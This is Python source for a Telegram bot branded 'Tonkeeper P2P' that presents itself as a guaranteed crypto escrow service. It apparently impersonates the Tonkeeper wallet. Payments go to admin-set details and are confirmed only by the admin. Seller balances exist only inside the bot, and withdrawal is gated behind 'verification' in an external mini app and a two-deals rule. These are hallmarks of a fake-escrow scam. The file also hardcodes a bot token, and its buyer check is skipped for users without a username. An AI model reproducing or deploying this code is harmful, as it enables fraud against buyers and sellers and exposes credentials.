import asyncio
import json
import os
import uuid
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "Tonkeeper P2P"
SUPPORT_LINK = "@p2psupbot"
CHANNEL_LINK = "https://t.me/tonkeeper_news"

# ССЫЛКА НА MINI APP (ВАША)
MINI_APP_URL = "https://fantastic-melomakarona-889472.netlify.app/"
# ========== ИНИЦИАЛИЗАЦИЯ ==========
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ========== ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ==========
DEALS_FILE = "deals.json"
ADMINS_FILE = "admins.json"
BALANCE_FILE = "balance.json"
REKVISITS_FILE = "rekvisits.json"
REVIEWS_FILE = "reviews.json"
VERIFICATION_FILE = "verification.json"
WITHDRAW_REQUESTS_FILE = "withdraw_requests.json"
USER_LANGUAGE_FILE = "user_language.json"

# ========== ЗАГРУЗКА ДАННЫХ ==========
def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(DEALS_FILE)
admins = load_json(ADMINS_FILE)
balance = load_json(BALANCE_FILE)
rekvisits = load_json(REKVISITS_FILE)
reviews = load_json(REVIEWS_FILE)
verification_data = load_json(VERIFICATION_FILE)
withdraw_requests = load_json(WITHDRAW_REQUESTS_FILE)
user_language = load_json(USER_LANGUAGE_FILE)

# ========== ПОМОЩНИКИ ==========
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(BALANCE_FILE, balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(BALANCE_FILE, balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

def complete_verification(user_id: int):
    uid = str(user_id)
    verification_data[uid] = {"verified_at": datetime.now().isoformat()}
    save_json(VERIFICATION_FILE, verification_data)

def get_rekvisits_text(currency: str, amount: float) -> str:
    """Безопасное получение текста реквизитов с подстановкой"""
    curr_key = currency.lower()
    default_text = f"Оплатите {amount} {currency} по реквизитам, указанным в Mini App"
    
    if curr_key in rekvisits:
        try:
            # Подставляем все возможные переменные
            text = rekvisits[curr_key]
            # Заменяем все плейсхолдеры
            text = text.replace('{amount}', str(amount))
            text = text.replace('{BOT_USERNAME}', BOT_USERNAME)
            text = text.replace('{SUPPORT_LINK}', SUPPORT_LINK)
            text = text.replace('{CHANNEL_LINK}', CHANNEL_LINK)
            return text
        except Exception as e:
            print(f"Error formatting rekvisits: {e}")
            return default_text
    return default_text

# ========== КЛАВИАТУРЫ ==========
def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
    buttons = [
        [
            InlineKeyboardButton(text="📱 Создать сделку", callback_data="create_deal_choice"),
            InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text="📊 Мои сделки", callback_data="menu_deals"),
            InlineKeyboardButton(text="⭐️ Отзывы", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
        ]
    ]
    
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text="👑 Админ панель", callback_data="menu_admin"),
        ])
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def create_deal_choice_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Создать в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text="🤖 Создать в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

def deal_created_keyboard(deal_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Скопировать ссылку", callback_data=f"copy_link_{deal_id}")],
        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
    ])

def currency_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

def back_to_main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
    ])

# ========== FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ В БОТЕ ==========
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_buyer = State()

# ========== ОБРАБОТЧИКИ ==========

# --- СТАРТ ---
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверка, не перешли ли по ссылке сделки
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return

    # Проверка, есть ли язык
    uid = str(message.from_user.id)
    if uid not in user_language:
        await message.answer(
            "🌐 <b>Выберите язык / Choose language</b>\n\n"
            "🇷🇺 Русский\n🇬🇧 English",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")],
                [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")],
            ])
        )
        return

    lang = user_language.get(uid, "ru")
    await message.answer(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n"
        "Надёжно, быстро, с гарантией!\n\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(message.from_user.id)
    )

# --- ВЫБОР ЯЗЫКА ---
@dp.callback_query(lambda c: c.data.startswith("lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[1]
    user_language[str(callback.from_user.id)] = lang
    save_json(USER_LANGUAGE_FILE, user_language)
    
    await callback.message.edit_text(
        f"✅ Язык установлен / Language set!\n\n"
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Выберите действие:",
        reply_markup=main_menu_keyboard(callback.from_user.id)
    )
    await callback.answer()

# --- ГЛАВНОЕ МЕНЮ ---
@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(
            "🔥 <b>Tonkeeper P2P</b> 🔥\n\n"
            "Выберите действие:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    except Exception as e:
        # Если не удалось отредактировать - отправляем новое сообщение
        await callback.message.answer(
            "🔥 <b>Tonkeeper P2P</b> 🔥\n\n"
            "Выберите действие:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    await callback.answer()

# --- СОЗДАНИЕ СДЕЛКИ (ВЫБОР) ---
@dp.callback_query(lambda c: c.data == "create_deal_choice")
async def create_deal_choice(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(
            "📱 <b>Создать сделку</b>\n\n"
            "Выберите способ создания:\n"
            "• <b>Mini App</b> — удобный интерфейс с отзывами и статистикой\n"
            "• <b>Бот</b> — быстрый текстовый режим\n\n"
            "Какой способ предпочитаете?",
            reply_markup=create_deal_choice_keyboard()
        )
    except:
        await callback.message.answer(
            "📱 <b>Создать сделку</b>\n\n"
            "Выберите способ создания:",
            reply_markup=create_deal_choice_keyboard()
        )
    await callback.answer()

# --- СОЗДАНИЕ В БОТЕ (ШАГ 1) ---
@dp.callback_query(lambda c: c.data == "create_deal_bot")
async def create_deal_bot(callback: types.CallbackQuery, state: FSMContext):
    try:
        await callback.message.edit_text(
            "📝 <b>Создание сделки (шаг 1 из 4)</b>\n\n"
            "Опишите товар или услугу, которую вы продаёте.\n"
            "Пример: NFT-подарок Telegram Premium"
        )
    except:
        await callback.message.answer(
            "📝 <b>Создание сделки (шаг 1 из 4)</b>\n\n"
            "Опишите товар или услугу, которую вы продаёте."
        )
    await state.set_state(DealStates.waiting_product)
    await callback.answer()

@dp.message(DealStates.waiting_product)
async def get_product(message: types.Message, state: FSMContext):
    await state.update_data(product=message.text.strip())
    await message.answer(
        "💱 <b>Шаг 2 из 4</b>\n\n"
        "Выберите валюту сделки:",
        reply_markup=currency_keyboard()
    )
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    try:
        await callback.message.edit_text(
            f"💰 <b>Шаг 3 из 4</b>\n\n"
            f"Введите сумму сделки в <b>{currency}</b>:\n"
            "Пример: 100"
        )
    except:
        await callback.message.answer(
            f"💰 <b>Шаг 3 из 4</b>\n\n"
            f"Введите сумму сделки в <b>{currency}</b>:"
        )
    await state.set_state(DealStates.waiting_amount)
    await callback.answer()

@dp.message(DealStates.waiting_amount)
async def get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer(
            "👤 <b>Шаг 4 из 4</b>\n\n"
            "Введите <b>username покупателя</b> (без @):\n"
            "Пример: john_doe\n\n"
            "⚠️ Только этот пользователь сможет перейти по ссылке"
        )
        await state.set_state(DealStates.waiting_buyer)
    except:
        await message.answer("❌ Введите положительное число")

@dp.message(DealStates.waiting_buyer)
async def get_buyer(message: types.Message, state: FSMContext):
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username or str(message.from_user.id),
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None
    }
    save_json(DEALS_FILE, deals)

    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    await message.answer(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"📦 Товар: {data['product']}\n"
        f"💰 Сумма: {data['amount']} {data['currency']}\n"
        f"👤 Покупатель: @{buyer_username}\n\n"
        f"🔗 <b>Ссылка для покупателя:</b>\n"
        f"<code>{link}</code>\n\n"
        f"📋 Нажмите кнопку ниже, чтобы скопировать ссылку",
        reply_markup=deal_created_keyboard(deal_id)
    )

    await state.clear()

# --- КОПИРОВАНИЕ ССЫЛКИ ---
@dp.callback_query(lambda c: c.data.startswith("copy_link_"))
async def copy_link_callback(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    await callback.answer(f"Ссылка скопирована! ✅\n{link}", show_alert=True)

# --- ОБРАБОТКА ПЕРЕХОДА ПО ССЫЛКЕ ---
async def handle_deal_link(message: types.Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer("❌ Сделка уже завершена или недоступна")
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(
            f"❌ Доступ запрещён!\n\n"
            f"Эта сделка создана для @{deal['buyer_username']}"
        )
        return

    deal["buyer_id"] = message.from_user.id
    save_json(DEALS_FILE, deals)

    # Показываем реквизиты для оплаты
    pay_text = get_rekvisits_text(deal["currency"], deal["amount"])

    await message.answer(
        f"✈️ <b>Сделка #{deal_id}</b>\n\n"
        f"📦 Товар: {deal['product']}\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"👤 Продавец: @{deal['seller_username']}\n\n"
        f"💳 <b>Реквизиты для оплаты:</b>\n"
        f"{pay_text}\n\n"
        f"После оплаты напишите админу: /pay {deal_id}\n\n"
        f"Или используйте Mini App: {MINI_APP_URL}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )

# --- БАЛАНС ---
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    bal = get_balance(callback.from_user.id)
    text = (
        f"💰 <b>Ваш баланс</b>\n\n"
        f"💎 TON: {bal.get('ton', 0)}\n"
        f"⭐️ STARS: {bal.get('stars', 0)}\n"
        f"💰 RUB: {bal.get('rub', 0)}\n"
        f"🌐 UAH: {bal.get('uah', 0)}\n\n"
        f"📊 Сделок завершено: {sum(bal.get('deal_partners', {}).values())}"
    )
    
    try:
        await callback.message.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    except:
        await callback.message.answer(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💲 Вывести средства", callback_data="withdraw_start")],
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    await callback.answer()

# --- МОИ СДЕЛКИ ---
@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))

    if not user_deals:
        try:
            await callback.message.edit_text(
                "📭 У вас нет сделок",
                reply_markup=back_to_main_keyboard()
            )
        except:
            await callback.message.answer(
                "📭 У вас нет сделок",
                reply_markup=back_to_main_keyboard()
            )
        return

    text = "📊 <b>Ваши сделки</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }.get(d['status'], d['status'])
        text += f"#{d_id} | {status} | {d['amount']} {d['currency']}\n"
        text += f"   → {d['product'][:30]}\n\n"

    try:
        await callback.message.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    except:
        await callback.message.answer(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    await callback.answer()

# --- ОТЗЫВЫ ---
@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    reviews_list = list(reviews.values())[-20:]
    
    if not reviews_list:
        text = "⭐️ <b>Отзывы</b>\n\nПока нет отзывов. Будьте первым!"
    else:
        text = "⭐️ <b>Последние отзывы</b>\n\n"
        for r in reviews_list[-5:]:
            text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
            text += f"📝 {r.get('text', '')[:100]}\n\n"
    
    try:
        await callback.message.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📝 Написать отзыв", callback_data="write_review")],
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    except:
        await callback.message.answer(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📝 Написать отзыв", callback_data="write_review")],
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    await callback.answer()

# --- НАПИСАНИЕ ОТЗЫВА ---
@dp.callback_query(lambda c: c.data == "write_review")
async def write_review(callback: types.CallbackQuery):
    # Проверка верификации
    if not is_verified(callback.from_user.id):
        await callback.message.edit_text(
            "⚠️ <b>Для написания отзыва необходима верификация!</b>\n\n"
            "Пройдите проверку в Mini App:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    # Проверка сделок
    user_deals = [d for d in deals.values() if d.get("seller_id") == callback.from_user.id and d.get("status") == "completed"]
    if len(user_deals) < 1:
        await callback.message.edit_text(
            "⚠️ <b>Для написания отзыва нужно совершить хотя бы 1 сделку!</b>\n\n"
            "Создайте сделку и завершите её, чтобы оставить отзыв.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    # Отправляем в Mini App
    await callback.message.edit_text(
        "📝 <b>Написать отзыв</b>\n\n"
        "Используйте Mini App для написания отзыва:\n"
        "1. Нажмите «Открыть Mini App»\n"
        "2. Перейдите в раздел «Отзывы»\n"
        "3. Напишите свой отзыв анонимно",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- ВЫВОД СРЕДСТВ ---
@dp.callback_query(lambda c: c.data == "withdraw_start")
async def withdraw_start(callback: types.CallbackQuery):
    # Проверка верификации
    if not is_verified(callback.from_user.id):
        await callback.message.edit_text(
            "⚠️ <b>Для вывода средств необходима верификация!</b>\n\n"
            "Пройдите проверку в Mini App.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    # Проверка 2 сделок с одним покупателем
    bal = get_balance(callback.from_user.id)
    partners = bal.get("deal_partners", {})
    can_withdraw = any(count >= 2 for count in partners.values())

    if not can_withdraw:
        await callback.message.edit_text(
            "⚠️ <b>Для вывода нужно 2 сделки с одним покупателем!</b>\n\n"
            f"Сейчас: {sum(partners.values())} сделок с {len(partners)} покупателями.\n\n"
            "Создайте и завершите ещё сделки.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
        return

    await callback.message.edit_text(
        "💲 <b>Вывод средств</b>\n\n"
        "Используйте Mini App для вывода средств:\n"
        "1. Нажмите «Открыть Mini App»\n"
        "2. Перейдите в раздел «Баланс»\n"
        "3. Выберите валюту и введите реквизиты",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- АДМИН ПАНЕЛЬ ---
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    await callback.message.edit_text(
        "👑 <b>Админ панель</b>\n\n"
        "Управление ботом и Mini App:\n"
        "• Все сделки\n"
        "• Заявки на вывод\n"
        "• Управление балансами\n"
        "• Модерация отзывов\n\n"
        "Используйте <b>Mini App</b> для полного управления:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App (Админ)", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
        ])
    )
    await callback.answer()

# --- КОМАНДА /PAY (ДЛЯ АДМИНА) ---
@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ Использование: /pay [ID сделки]")
        return

    deal_id = args[1]
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer("❌ Сделка уже обработана")
        return

    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_json(DEALS_FILE, deals)

    await message.answer(f"✅ Оплата подтверждена для сделки #{deal_id}")

    # Уведомляем продавца
    try:
        await bot.send_message(
            deal["seller_id"],
            f"💎 <b>Сделка #{deal_id} оплачена!</b>\n\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Покупатель: @{deal['buyer_username']}\n\n"
            f"Нажмите <b>«Передал товар»</b> в Mini App или боте",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📦 Передал товар", callback_data=f"seller_done_{deal_id}")],
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
            ])
        )
    except Exception as e:
        print(f"Error notifying seller: {e}")

# --- ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ ТОВАРА (ПРОДАВЕЦ) ---
@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_done(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer("⏳ Сначала оплата должна быть подтверждена")
        return

    deal["status"] = "awaiting_confirmation"
    save_json(DEALS_FILE, deals)

    await callback.message.edit_text(
        f"✅ Вы подтвердили передачу товара по сделке #{deal_id}\n\n"
        f"Ожидайте подтверждения от покупателя"
    )
    await callback.answer()

# --- ПОДТВЕРЖДЕНИЕ ПОЛУЧЕНИЯ (ПОКУПАТЕЛЬ) ---
@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer("⏳ Сделка не в статусе ожидания подтверждения")
        return

    # Зачисляем средства продавцу
    add_balance(deal["seller_id"], deal["currency"], deal["amount"])
    
    # Обновляем статистику партнёров
    seller_balance = get_balance(deal["seller_id"])
    buyer = deal["buyer_username"]
    if buyer not in seller_balance["deal_partners"]:
        seller_balance["deal_partners"][buyer] = 0
    seller_balance["deal_partners"][buyer] += 1
    save_json(BALANCE_FILE, balance)

    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_json(DEALS_FILE, deals)

    await callback.message.edit_text(
        f"🎉 <b>Сделка #{deal_id} завершена!</b>\n\n"
        f"💳 {deal['amount']} {deal['currency']} зачислены на баланс продавца\n\n"
        f"Спасибо за использование {BOT_NAME}!",
        reply_markup=back_to_main_keyboard()
    )
    await callback.answer()

# ========== ЗАПУСК ==========
async def main():
    print("🔥 Tonkeeper P2P Бот запущен")
    print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
    print(f"📱 Mini App URL: {MINI_APP_URL}")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print("✅ Бот готов к работе!")

    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
